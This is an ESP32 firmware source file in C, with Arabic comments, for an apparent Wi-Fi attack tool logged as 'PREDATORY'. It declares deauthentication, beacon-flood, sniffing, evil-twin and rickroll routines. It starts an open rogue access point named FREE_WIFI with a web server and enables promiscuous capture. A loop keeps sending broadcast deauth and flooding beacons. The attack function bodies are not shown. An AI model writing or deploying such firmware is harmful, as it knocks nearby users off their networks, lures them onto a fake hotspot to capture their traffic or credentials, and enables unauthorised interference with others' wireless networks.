#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_log.h"

static const char *TAG = "PREDATORY";

// دوال الهجمات
void deauth_attack(uint8_t *bssid);
void beacon_flood(char *ssid);
void start_sniffing(void);
void evil_twin_start(char *target_ssid);
void rickroll_start(void);
void start_web_server(void);

// دوال معالجة الأوامر
void handle_deauth(void);
void handle_beacon(void);
void handle_sniff(void);
void handle_evil_twin(void);
void handle_rickroll(void);

// مهمة الهجمات الرئيسية
void attack_loop(void *pv) {
    while(1) {
        uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        deauth_attack(bssid);
        beacon_flood("FREE_WIFI");
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }
}

// تشغيل نقطة الوصول
void start_ap(void) {
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREE_WIFI",
            .ssid_len = 9,
            .password = "",
            .channel = 6,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
        },
    };
    
    ESP_LOGI(TAG, "Starting AP...");
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    ESP_LOGI(TAG, "AP Started: FREE_WIFI");
}

void app_main(void) {
    ESP_LOGI(TAG, "App starting...");
    
    // تهيئة NVS مع مسح تلقائي عند التلف
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGI(TAG, "Erasing NVS...");
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // تهيئة الشبكة
    ESP_LOGI(TAG, "Initializing network...");
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    // تهيئة WiFi مع تحسينات
    ESP_LOGI(TAG, "Initializing WiFi...");
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    
    // تشغيل AP
    start_ap();
    
    // تشغيل خادم الويب
    ESP_LOGI(TAG, "Starting web server...");
    start_web_server();
    
    // تأخير للتأكد من استقرار الشبكة
    vTaskDelay(2000 / portTICK_PERIOD_MS);
    
    // تفعيل وضع التنصت مع تحسينات
    ESP_LOGI(TAG, "Enabling promiscuous mode...");
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    
    // تشغيل الهجمات
    ESP_LOGI(TAG, "Starting attacks...");
    xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "System ready! Connect to FREE_WIFI and visit 192.168.4.1");
}
